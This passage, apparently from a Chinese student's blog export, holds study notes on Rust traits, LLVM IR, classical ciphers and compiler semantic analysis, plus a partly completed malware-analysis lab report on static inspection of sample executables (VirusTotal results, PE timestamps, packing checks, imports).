&#123;</span><br><span class="line">        <span class="keyword">self</span>.side * <span class="keyword">self</span>.side</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">print_area</span>(shape: &amp;<span class="keyword">dyn</span> Shape) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Area: &#123;&#125;&quot;</span>, shape.<span class="title function_ invoke__">area</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">circle</span> = Circle &#123; radius: <span class="number">5.0</span> &#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">square</span> = Square &#123; side: <span class="number">3.0</span> &#125;;</span><br><span class="line">    <span class="title function_ invoke__">print_area</span>(&amp;circle);</span><br><span class="line">    <span class="title function_ invoke__">print_area</span>(&amp;square);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/09/08/rust/rust%E5%AE%8F%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p><a href="https://rustmagazine.github.io/rust_magazine_2021/chapter_1/toc.html">https://rustmagazine.github.io/rust_magazine_2021/chapter_1/toc.html</a></p>
<p><a href="https://zjp-cn.github.io/tlborm/proc-macros/methodical/derive.html">https://zjp-cn.github.io/tlborm/proc-macros/methodical/derive.html</a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/09/09/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/LLVM%20IR/</url>
    <content><![CDATA[<h1 id="llvm-ir（初探）"><a href="#llvm-ir（初探）" class="headerlink" title="llvm ir（初探）"></a>llvm ir（初探）</h1><p>本节学习IR（中间表示）（初探）</p>
<p>扩展：</p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240910005409787.png" alt="image-20240910005409787"></p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240910005354879.png" alt="image-20240910005354879"></p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240910005204216.png" alt="image-20240910005204216"></p>
<h2 id="1-形式"><a href="#1-形式" class="headerlink" title="1.形式"></a>1.形式</h2><blockquote>
<p>需要知道程序是如何翻译为ir的，但是了解过程之前，需要知道何为ir</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909215944239.png" alt="image-20240909215944239"></p>
<h2 id="1-1三地址码"><a href="#1-1三地址码" class="headerlink" title="1.1三地址码"></a>1.1三地址码</h2><blockquote>
<p>静态单赋值</p>
</blockquote>
<h3 id="1-1-1简单形式（仅顺序且最多调用函数）"><a href="#1-1-1简单形式（仅顺序且最多调用函数）" class="headerlink" title="1.1.1简单形式（仅顺序且最多调用函数）"></a>1.1.1简单形式（仅顺序且最多调用函数）</h3><p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909220515875.png" alt="image-20240909220515875"></p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909220157173.png" alt="image-20240909220157173"></p>
<blockquote>
<p>含义</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909220438564.png" alt="image-20240909220438564"></p>
<h3 id="1-1-2-进一步形式"><a href="#1-1-2-进一步形式" class="headerlink" title="1.1.2 进一步形式"></a>1.1.2 进一步形式</h3><blockquote>
<p>函数中有分支（为了研究函数中的基本块）</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909221937335.png" alt="image-20240909221937335"></p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909222753665.png" alt="image-20240909222753665"></p>
<blockquote>
<p>优化之后</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909224626604.png" alt="image-20240909224626604"></p>
<blockquote>
<p>何为基本块：</p>
<p>只能在入口跳入，或在出口跳出，边用来描述基本块之间的跳转。</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909222324799.png" alt="image-20240909222324799"></p>
<blockquote>
<p>重要指令phi</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909225136105.png" alt="image-20240909225136105"></p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909225212230.png" alt="image-20240909225212230"></p>
<h3 id="1-1-2-加上循环"><a href="#1-1-2-加上循环" class="headerlink" title="1.1.2 加上循环"></a>1.1.2 加上循环</h3><p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240910003633534.png" alt="image-20240910003633534"></p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240910004211809.png" alt="image-20240910004211809"></p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240910004927981.png" alt="image-20240910004927981"></p>
<h2 id="2-实现"><a href="#2-实现" class="headerlink" title="2.实现"></a>2.实现</h2><blockquote>
<p>可调用llvm提供的构建指令的api</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/09/05/%E5%AF%86%E7%A0%81%E5%AD%A6/first_class/</url>
    <content><![CDATA[<h2 id="古典密码学"><a href="#古典密码学" class="headerlink" title="古典密码学"></a>古典密码学</h2><h3 id="古典密码体制"><a href="#古典密码体制" class="headerlink" title="古典密码体制"></a>古典密码体制</h3><blockquote>
<p>是否可以表示所有的古典密码体制？？？</p>
<p>加解密需要可逆的特性，因此数论的研究是十分适合密码学的</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240905080535709.png" alt="image-20240905080535709"></p>
<h3 id="通信信道模型"><a href="#通信信道模型" class="headerlink" title="通信信道模型"></a>通信信道模型</h3><blockquote>
<p>古典密码学下的通信模型</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240905080812648.png" alt="image-20240905080812648"></p>
<h3 id="1-1移位密码"><a href="#1-1移位密码" class="headerlink" title="1.1移位密码"></a>1.1移位密码</h3><blockquote>
<p>凯撒密码</p>
<p>安全？：最多25次即可猜出有意义的明文</p>
<p>期望：13次</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240905081306644.png" alt="image-20240905081306644"></p>
<h3 id="1-2代换密码"><a href="#1-2代换密码" class="headerlink" title="1.2代换密码"></a>1.2代换密码</h3><blockquote>
<p>增大了穷举空间，为1.1的发展</p>
<p>可以理解为广义的凯撒密码。</p>
<p>安全？：26的阶乘，10的26次幂，可以频率分析。一个字符只能映射为另一个，因此只是形式上的变化，但是可以利用自然语言的频率上的漏洞，找除形式之外可以区分开的东西。</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240905082451577.png" alt="image-20240905082451577"></p>
<h3 id="1-3放射密码"><a href="#1-3放射密码" class="headerlink" title="1.3放射密码"></a>1.3放射密码</h3><blockquote>
<p>进一步增大了密钥空间。</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240905084211886.png" alt="image-20240905084211886"></p>
<h3 id="1-4维吉尼亚密码"><a href="#1-4维吉尼亚密码" class="headerlink" title="1.4维吉尼亚密码"></a>1.4维吉尼亚密码</h3><blockquote>
<p>不只是形式上的变换，频率也会变。</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240905085028255.png" alt="image-20240905085028255"></p>
<h3 id="1-5希尔密码"><a href="#1-5希尔密码" class="headerlink" title="1.5希尔密码"></a>1.5希尔密码</h3><blockquote>
<p>加密后的信息更加混乱，但是不同的分组之间是否有联系？</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240905085910513.png" alt="image-20240905085910513"></p>
<h3 id="1-6置换密码"><a href="#1-6置换密码" class="headerlink" title="1.6置换密码"></a>1.6置换密码</h3><blockquote>
<p>希尔密码的特例。</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240905090322903.png" alt="image-20240905090322903"></p>
<h3 id="1-7-流加密"><a href="#1-7-流加密" class="headerlink" title="1.7 流加密"></a>1.7 流加密</h3><blockquote>
<p>去除每一个加密组的联系，为之前的体制的扩展</p>
<p>密钥流可预测。</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240905091052381.png" alt="image-20240905091052381"></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/09/09/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/lab1/</url>
    <content><![CDATA[<h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a><strong>一、实验目的</strong></h2><h2 id="二、实验原理"><a href="#二、实验原理" class="headerlink" title="二、实验原理"></a><strong>二、实验原理</strong></h2><h2 id="三、实验过程"><a href="#三、实验过程" class="headerlink" title="三、实验过程"></a><strong>三、实验过程</strong></h2><h3 id="lab-1-1"><a href="#lab-1-1" class="headerlink" title="lab 1-1"></a><strong>lab 1-1</strong></h3><blockquote>
<p>这个实验使用Lab01-01.exe和Lab01-01.dll文件,的信息。</p>
</blockquote>
<ul>
<li><h4 id="Q1-将文件上传至http-www-VirusTotal-com-进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗"><a href="#Q1-将文件上传至http-www-VirusTotal-com-进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗" class="headerlink" title="Q1.将文件上传至http://www.VirusTotal.com/进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗?"></a>Q1.将文件上传至<a href="http://www.virustotal.com/%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%8A%A5%E5%91%8A%E3%80%82%E6%96%87%E4%BB%B6%E5%8C%B9%E9%85%8D%E5%88%B0%E4%BA%86%E5%B7%B2%E6%9C%89%E7%9A%84%E5%8F%8D%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E7%89%B9%E5%BE%81%E5%90%97">http://www.VirusTotal.com/进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗</a>?</h4><blockquote>
<p>成功识别出恶意文件，exe和dll最初识别结果如下：</p>
</blockquote>
<p><strong>exe</strong></p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909111144275.png" alt="image-20240909111144275"></p>
<p><strong>dll</strong></p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909111208469.png"></p>
<p>结果显示超过半数的安全供应商将其识别成恶意软件，基本已经可以判断其为恶意软件了。</p>
<blockquote>
<p>VT也识别出了其hash值，string等相关特征，exe和dll分别的结果如下：</p>
</blockquote>
<p><strong>exe</strong>：</p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909111624955.png" alt="image-20240909111624955"></p>
<p><strong>dll</strong>：</p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909111533846.png" alt="image-20240909111533846"></p>
<blockquote>
<p>VT也识别出了其pe文件的相关特征，exe和dll分别的结果如下：</p>
</blockquote>
<p><strong>exe</strong>：</p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909111703399.png" alt="image-20240909111703399"></p>
<p><strong>dll</strong>：</p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909111720986.png" alt="image-20240909111720986"></p>
<p>以上信息均可对其做出是否为恶意文件的初步判断。</p>
</li>
<li><h4 id="Q2-这些文件是什么时候编译的"><a href="#Q2-这些文件是什么时候编译的" class="headerlink" title="Q2.这些文件是什么时候编译的?"></a>Q2.这些文件是什么时候编译的?</h4><blockquote>
<p>可通过查看<code>pe</code>文件中的<code>struct IMAGE_NT_HEADERS NtHeader</code> 中的<code>IMAGE_FILE_HEADER FileHeader</code>得到答案。exe和dll分别如下图所示（010editor）：</p>
</blockquote>
<p><strong>exe</strong>：时间戳值为：0x4d0e2fd3（小端法）</p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909112450130.png" alt="image-20240909112450130"></p>
<p>网上在线工具转换：可以看出和010相差8h，010转换的是UTC时间，因此010加上8h则可以得到东八区时间（北京时间）。</p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909122038455.png" alt="image-20240909122038455"></p>
<p><strong>dll</strong>：时间戳值为：0x4d0e2fe6（小端法）</p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909112354943.png" alt="image-20240909112354943"></p>
<p>转换规则同上。</p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909122251259.png" alt="image-20240909122251259"></p>
</li>
<li><h4 id="Q3-这两个文件中是否存在迹象说明它们是否被加壳或混淆了-如果是-这些迹象在哪里"><a href="#Q3-这两个文件中是否存在迹象说明它们是否被加壳或混淆了-如果是-这些迹象在哪里" class="headerlink" title="Q3.这两个文件中是否存在迹象说明它们是否被加壳或混淆了?如果是,这些迹象在哪里?"></a>Q3.这两个文件中是否存在迹象说明它们是否被加壳或混淆了?如果是,这些迹象在哪里?</h4><blockquote>
<p>没有被加壳，两个文件的pe中都能正确显示section信息，若被加壳的话section是不会被正确现实的，需要通过解码程序来找到<code>OEP</code>。</p>
</blockquote>
<p><strong>exe</strong></p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909112658199.png" alt="image-20240909112658199"></p>
<p><strong>dll</strong></p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909112633934.png" alt="image-20240909112633934"></p>
<blockquote>
<p>文件也没有被混淆，可以通过die查看文件的信息熵，可以观察到都是比较低的，如果文件经过加密、压缩或混淆，其熵值会接近 7 或 8，而该文件的各节熵值大致在 4 到 4.5 之间，dll则更低了。</p>
</blockquote>
<p><strong>exe</strong></p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909123305249.png" alt="image-20240909123305249"></p>
<p><strong>dll</strong></p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909123423745.png" alt="image-20240909123423745"></p>
</li>
<li><h4 id="Q4-是否有导入函数显示出了这个恶意代码是做什么的-如果是-是哪些导入函数"><a href="#Q4-是否有导入函数显示出了这个恶意代码是做什么的-如果是-是哪些导入函数" class="headerlink" title="Q4.是否有导入函数显示出了这个恶意代码是做什么的?如果是,是哪些导入函数?"></a>Q4.是否有导入函数显示出了这个恶意代码是做什么的?如果是,是哪些导入函数?</h4><blockquote>
<p>两个程序导入函数都有正确的符号，符号没有被strip，因此可以通过导入函数来初步判断程序功能，具体的查看方式可以通过010editor查看可执行文件的导入名称表（INT）</p>
</blockquote>
<p><strong>exe</strong></p>
<blockquote>
<p>只导入了两个库。</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909131336965.png" alt="image-20240909131336965"></p>
<blockquote>
<p>kernel32.dll导入描述目录以及导入表中的导入名称表项如下：这些函数与进程控制、线程同步和资源管理密切相关。通常用于创建进程、管理互斥锁、同步线程，以及控制程序执行时间。</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909131423082.png" alt="image-20240909131423082"></p>
<blockquote>
<p>这个是msvc的运行时库，也就是编程开发人员常用库，提供一些最基本的函数调用接口，如内存动态分配，字符串操作等等。</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909131526983.png" alt="image-20240909131526983"></p>
<p><strong>dll</strong></p>
<blockquote>
<p>可以观察到其导入了三个库，接下来可以分别查看三个库的导入信息表。</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909123834236.png" alt="image-20240909123834236"></p>
<blockquote>
<p>同exe文件分析。</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909124124143.png" alt="image-20240909124124143"></p>
<blockquote>
<p>ws2_32.dll如下：其中有个值得注意的事情，那就是其导入名称表是空的，OriginalFirstThunk原来指向导入名称表，但是现在指向的是ordinal，可以用die查看比较直观，ws2_32.dll的导出描述符有相应的索引，因此这样可以加速文件查找，否则就需要拿字符串对比。此库中的功能和网络通信相关。</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909130822720.png" alt="image-20240909130822720"></p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909130853687.png" alt="image-20240909130853687"></p>
<blockquote>
<p>同exe文件分析</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909124229386.png" alt="image-20240909124229386"></p>
</li>
<li><h4 id="Q5-是否有任何其他文件或基于主机的迹象-让你可以在受感染系统上查找"><a href="#Q5-是否有任何其他文件或基于主机的迹象-让你可以在受感染系统上查找" class="headerlink" title="Q5.是否有任何其他文件或基于主机的迹象,让你可以在受感染系统上查找?"></a>Q5.是否有任何其他文件或基于主机的迹象,让你可以在受感染系统上查找?</h4></li>
<li><h4 id="Q6-是否有基于网络的迹象-可以用来发现受感染机器上的这个恶意代码"><a href="#Q6-是否有基于网络的迹象-可以用来发现受感染机器上的这个恶意代码" class="headerlink" title="Q6.是否有基于网络的迹象,可以用来发现受感染机器上的这个恶意代码?"></a>Q6.是否有基于网络的迹象,可以用来发现受感染机器上的这个恶意代码?</h4></li>
<li><h4 id="Q7-你猜这些文件的目的是什么"><a href="#Q7-你猜这些文件的目的是什么" class="headerlink" title="Q7.你猜这些文件的目的是什么?"></a>Q7.你猜这些文件的目的是什么?</h4></li>
</ul>
<h3 id="lab-1-2"><a href="#lab-1-2" class="headerlink" title="lab 1-2"></a><strong>lab 1-2</strong></h3><blockquote>
<p>分析Lab01-02.exe</p>
</blockquote>
<ul>
<li><h4 id="Q1-将-Lab01-02-exe-文件上传至http-www-VirusTotal-com-进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗"><a href="#Q1-将-Lab01-02-exe-文件上传至http-www-VirusTotal-com-进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗" class="headerlink" title="Q1.将 Lab01-02.exe 文件上传至http://www.VirusTotal.com/进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗?"></a>Q1.将 Lab01-02.exe 文件上传至<a href="http://www.virustotal.com/%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%8A%A5%E5%91%8A%E3%80%82%E6%96%87%E4%BB%B6%E5%8C%B9%E9%85%8D%E5%88%B0%E4%BA%86%E5%B7%B2%E6%9C%89%E7%9A%84%E5%8F%8D%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E7%89%B9%E5%BE%81%E5%90%97">http://www.VirusTotal.com/进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗</a>?</h4></li>
<li><h4 id="Q2-是否有这个文件被加壳或混淆的任何迹象-如果是这样-这些迹象是什么-如果该文件被加壳-请进行脱壳-如果可能的话。"><a href="#Q2-是否有这个文件被加壳或混淆的任何迹象-如果是这样-这些迹象是什么-如果该文件被加壳-请进行脱壳-如果可能的话。" class="headerlink" title="Q2.是否有这个文件被加壳或混淆的任何迹象?如果是这样,这些迹象是什么?如果该文件被加壳,请进行脱壳,如果可能的话。"></a>Q2.是否有这个文件被加壳或混淆的任何迹象?如果是这样,这些迹象是什么?如果该文件被加壳,请进行脱壳,如果可能的话。</h4></li>
<li><h4 id="Q3-有没有任何导入函数能够暗示出这个程序的功能-如果是-是哪些导入函数-它们会告诉你什么"><a href="#Q3-有没有任何导入函数能够暗示出这个程序的功能-如果是-是哪些导入函数-它们会告诉你什么" class="headerlink" title="Q3.有没有任何导入函数能够暗示出这个程序的功能?如果是,是哪些导入函数,它们会告诉你什么?"></a>Q3.有没有任何导入函数能够暗示出这个程序的功能?如果是,是哪些导入函数,它们会告诉你什么?</h4></li>
<li><h4 id="Q4-哪些基于主机或基于网络的迹象可以被用来确定被这个恶意代码所感染的机器"><a href="#Q4-哪些基于主机或基于网络的迹象可以被用来确定被这个恶意代码所感染的机器" class="headerlink" title="Q4.哪些基于主机或基于网络的迹象可以被用来确定被这个恶意代码所感染的机器?"></a>Q4.哪些基于主机或基于网络的迹象可以被用来确定被这个恶意代码所感染的机器?</h4></li>
</ul>
<h3 id="lab-1-3"><a href="#lab-1-3" class="headerlink" title="lab 1-3"></a><strong>lab 1-3</strong></h3><blockquote>
<p>分析Lab01-03.exe</p>
</blockquote>
<ul>
<li><h4 id="Q1-将Lab01-03-exe-文件上传至http-www-VirusTotal-com-进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗"><a href="#Q1-将Lab01-03-exe-文件上传至http-www-VirusTotal-com-进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗" class="headerlink" title="Q1.将Lab01-03.exe 文件上传至http://www.VirusTotal.com/进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗?"></a>Q1.将Lab01-03.exe 文件上传至<a href="http://www.virustotal.com/%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%8A%A5%E5%91%8A%E3%80%82%E6%96%87%E4%BB%B6%E5%8C%B9%E9%85%8D%E5%88%B0%E4%BA%86%E5%B7%B2%E6%9C%89%E7%9A%84%E5%8F%8D%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E7%89%B9%E5%BE%81%E5%90%97">http://www.VirusTotal.com/进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗</a>?</h4></li>
<li><h4 id="Q2-是否有这个文件被加壳或混淆的任何迹象-如果是这样-这些迹象是什么-如果该文件被加壳-请进行脱壳-如果可能的话。-1"><a href="#Q2-是否有这个文件被加壳或混淆的任何迹象-如果是这样-这些迹象是什么-如果该文件被加壳-请进行脱壳-如果可能的话。-1" class="headerlink" title="Q2.是否有这个文件被加壳或混淆的任何迹象?如果是这样,这些迹象是什么?如果该文件被加壳,请进行脱壳,如果可能的话。"></a>Q2.是否有这个文件被加壳或混淆的任何迹象?如果是这样,这些迹象是什么?如果该文件被加壳,请进行脱壳,如果可能的话。</h4></li>
<li><h4 id="Q3-有没有任何导入函数能够暗示出这个程序的功能-如果是-是哪些导入函数-它们会告诉你什么-1"><a href="#Q3-有没有任何导入函数能够暗示出这个程序的功能-如果是-是哪些导入函数-它们会告诉你什么-1" class="headerlink" title="Q3.有没有任何导入函数能够暗示出这个程序的功能?如果是,是哪些导入函数,它们会告诉你什么?"></a>Q3.有没有任何导入函数能够暗示出这个程序的功能?如果是,是哪些导入函数,它们会告诉你什么?</h4></li>
<li><h4 id="Q4-有哪些基于主机或基于网络的迹象-可以被用来确定被这个恶意代码所感染的机器"><a href="#Q4-有哪些基于主机或基于网络的迹象-可以被用来确定被这个恶意代码所感染的机器" class="headerlink" title="Q4.有哪些基于主机或基于网络的迹象,可以被用来确定被这个恶意代码所感染的机器?"></a>Q4.有哪些基于主机或基于网络的迹象,可以被用来确定被这个恶意代码所感染的机器?</h4></li>
</ul>
<h3 id="lab-1-4"><a href="#lab-1-4" class="headerlink" title="lab 1-4"></a><strong>lab 1-4</strong></h3><blockquote>
<p>分析Lab01-04.exe</p>
</blockquote>
<ul>
<li><h4 id="Q1-将Lab01-04-exe-文件上传至http-www-VirusTotal-com-进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗"><a href="#Q1-将Lab01-04-exe-文件上传至http-www-VirusTotal-com-进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗" class="headerlink" title="Q1.将Lab01-04.exe 文件上传至http://www.VirusTotal.com/进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗?"></a>Q1.将Lab01-04.exe 文件上传至<a href="http://www.virustotal.com/%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%8A%A5%E5%91%8A%E3%80%82%E6%96%87%E4%BB%B6%E5%8C%B9%E9%85%8D%E5%88%B0%E4%BA%86%E5%B7%B2%E6%9C%89%E7%9A%84%E5%8F%8D%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E7%89%B9%E5%BE%81%E5%90%97">http://www.VirusTotal.com/进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗</a>?</h4></li>
<li><h4 id="Q2-是否有这个文件被加壳或混淆的任何迹象-如果是这样-这些迹象是什么-如果该文件被加壳-请进行脱壳-如果可能的话。-2"><a href="#Q2-是否有这个文件被加壳或混淆的任何迹象-如果是这样-这些迹象是什么-如果该文件被加壳-请进行脱壳-如果可能的话。-2" class="headerlink" title="Q2.是否有这个文件被加壳或混淆的任何迹象?如果是这样,这些迹象是什么?如果该文件被加壳,请进行脱壳,如果可能的话。"></a>Q2.是否有这个文件被加壳或混淆的任何迹象?如果是这样,这些迹象是什么?如果该文件被加壳,请进行脱壳,如果可能的话。</h4></li>
<li><h4 id="Q3-这个文件是什么时候被编译的"><a href="#Q3-这个文件是什么时候被编译的" class="headerlink" title="Q3.这个文件是什么时候被编译的?"></a>Q3.这个文件是什么时候被编译的?</h4></li>
<li><h4 id="Q4-有没有任何导入函数能够暗示出这个程序的功能-如果是-是哪些导入函数-它们会告诉你什么"><a href="#Q4-有没有任何导入函数能够暗示出这个程序的功能-如果是-是哪些导入函数-它们会告诉你什么" class="headerlink" title="Q4.有没有任何导入函数能够暗示出这个程序的功能?如果是,是哪些导入函数,它们会告诉你什么?"></a>Q4.有没有任何导入函数能够暗示出这个程序的功能?如果是,是哪些导入函数,它们会告诉你什么?</h4></li>
<li><h4 id="Q5-有哪些基于主机或基于网络的迹象-可以被用来确定被这个恶意代码所感染的机器"><a href="#Q5-有哪些基于主机或基于网络的迹象-可以被用来确定被这个恶意代码所感染的机器" class="headerlink" title="Q5.有哪些基于主机或基于网络的迹象,可以被用来确定被这个恶意代码所感染的机器?"></a>Q5.有哪些基于主机或基于网络的迹象,可以被用来确定被这个恶意代码所感染的机器?</h4></li>
<li><h4 id="Q6-这个文件在资源段中包含一个资源。使用Resource-Hacker工具来检查资源-然后抽取资源。从资源中你能发现什么吗"><a href="#Q6-这个文件在资源段中包含一个资源。使用Resource-Hacker工具来检查资源-然后抽取资源。从资源中你能发现什么吗" class="headerlink" title="Q6.这个文件在资源段中包含一个资源。使用Resource Hacker工具来检查资源,然后抽取资源。从资源中你能发现什么吗?"></a>Q6.这个文件在资源段中包含一个资源。使用Resource Hacker工具来检查资源,然后抽取资源。从资源中你能发现什么吗?</h4></li>
</ul>
<h2 id="四、实验结论及心得体会"><a href="#四、实验结论及心得体会" class="headerlink" title="四、实验结论及心得体会"></a><strong>四、实验结论及心得体会</strong></h2>]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/09/09/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>语义分析在语法树的基础上，对程序作进一步的检查，来看程序是否是meaningful</p>
<h2 id="符号检查"><a href="#符号检查" class="headerlink" title="符号检查"></a>符号检查</h2><h3 id="1-符号表"><a href="#1-符号表" class="headerlink" title="1.符号表"></a>1.符号表</h3><blockquote>
<p>保存各种符号相关信息的数据结构</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909165833568.png" alt="image-20240909165833568"></p>
<blockquote>
<p>本节内容涉及教材</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909175211517.png" alt="image-20240909175211517"></p>
<h3 id="1-1作用域相关"><a href="#1-1作用域相关" class="headerlink" title="1.1作用域相关"></a>1.1作用域相关</h3><blockquote>
<p>嵌套作用域需要嵌套符号表，全局作用域还需放入类型符号以支持类型检查。</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909170554630.png" alt="image-20240909170554630"></p>
<blockquote>
<p>符号表的实现的接口</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909170955204.png" alt="image-20240909170955204"></p>
<blockquote>
<p>所要考虑的</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909172231667.png" alt="image-20240909172231667"></p>
<h3 id="2-文法分析（语义）（以类型为例子）（语法制导的定义）"><a href="#2-文法分析（语义）（以类型为例子）（语法制导的定义）" class="headerlink" title="2.文法分析（语义）（以类型为例子）（语法制导的定义）"></a>2.文法分析（语义）（以类型为例子）（语法制导的定义）</h3><blockquote>
<p>如何赋予语法树语义，并计算相应的节点的属性？通过赋予每个节点的类型相应属性的相应值来实现，实现过程主要有监听器的模式（遍历两次ast）或者直接写（嵌入到产生式之中，但是只需要遍历一次）</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909191503457.png" alt="image-20240909191503457"></p>
<blockquote>
<p>处理依赖关系，分别有上对下，水平，和下对上。做法：将action嵌入cfg</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909195422145.png" alt="image-20240909195422145"></p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909195708884.png" alt="image-20240909195708884"></p>
<blockquote>
<p>综合属性。</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909195930229.png" alt="image-20240909195930229"></p>
<blockquote>
<p>继承属性。</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909200212195.png" alt="image-20240909200212195"></p>
<blockquote>
<p>继承与综合属性的综合。主要涉及到数组类型。</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909204004991.png" alt="image-20240909204004991"></p>
